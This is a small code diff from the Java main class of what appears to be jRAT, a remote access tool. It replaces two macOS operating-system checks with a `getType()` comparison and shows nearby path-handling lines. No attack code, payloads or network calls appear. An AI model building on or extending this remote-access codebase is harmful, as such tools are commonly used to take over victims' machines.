@@ -56,7 +56,7 @@ public class Main {
 		} catch (Exception e) {
 			e.printStackTrace();
 		}
-		if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
+		if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.OSX) {
 			Main.debug("Default user.dir: " + System.getProperty("user.dir"));
 			if (System.getProperty("user.dir").contains("jRAT.app")) {
 				System.setProperty("user.dir", System.getProperty("user.dir").split("jRAT.app")[0] + "/jRAT.app");
@@ -84,7 +84,7 @@ public class Main {
 		debug = argsContains(args, "-debug");
 		hideTitle = argsContains(args, "-hidetitle");
 
-		if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX) {
+		if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.OSX) {
 			System.setProperty("apple.laf.useScreenMenuBar", "true");
 		}
 		
